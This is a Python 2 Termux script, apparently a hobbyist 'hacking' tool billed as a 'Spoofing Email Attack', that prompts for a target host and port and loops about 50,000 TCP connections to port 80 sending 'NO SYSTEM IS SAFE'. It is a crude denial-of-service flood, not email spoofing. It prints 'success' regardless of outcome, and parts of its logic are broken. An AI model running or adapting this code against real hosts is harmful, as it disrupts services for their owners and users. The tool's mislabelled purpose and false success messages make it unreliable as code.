#!/data/data/com.termux/files/usr/bin/python
# -*- coding: utf-8 -*-
# Spoofing
# Coded by Senja
# Github: https://github.com/stepbystepexe/Spoofing
from __opt__ import *
import os, sys, time, string, socket, marshal
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()
def loads():
    tix = [
     '.   ', '..  ', '... ']
    for o in tix:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mStarting ' + o,
        sys.stdout.flush()
        time.sleep(1)
def write(f):
    for e in f + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
os.system('clear')
os.system('reset')
time.sleep(1)
print
print (logo)
print("\033[0;102;90;1m[    Spoofing Email Attack v1.0, Coded by @stepbystep    ]\033[0m")
time.sleep(1)
print
host = raw_input("\033[0m[\033[95;1m+\033[0m] \033[77;1mWeb Target: \033[0m")
port = input("\033[0m[\033[92;1m+\033[0m] \033[77;1mInput Port: \033[0m")
connect=50000
ip = socket.gethostbyname( host )
write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
print
print ("\033[0m[\033[96;1m*\033[0m] Attacking \033[1;77m[" + host + "]")
time.sleep(3)
print ("\033[0m[\033[93;1m*\033[0m] Attack to ip \033[1;77m["+ ip + "]")
time.sleep(3)
message=("NO SYSTEM IS SAFE")
print
loads()
print
print
time.sleep(3)
def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("\033[0m[\033[91;1m!\033[0m] \033[77;1mNo connection to \033[0m [" + ip + "]")
    write ( "\033[0mSent [=\033[0;1;91mEMAIL\033[0m=] success to [\033[0;1;2;96m" + ip + "\033[0m]")
    ddos.close()
for i in range(1, connect):
    dos()
print("\033[0m[\033[91;1m!\033[0m] \033[77;1mSpoofing is failed ...")
if __name__ == "__main__":
    answer = raw_input(" \033[0m[\033[96;1m?\033[0m] \033[1;77mNext to Spoofing Lite: ")
    if answer.strip() in "y Y fire Fire FIRE".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
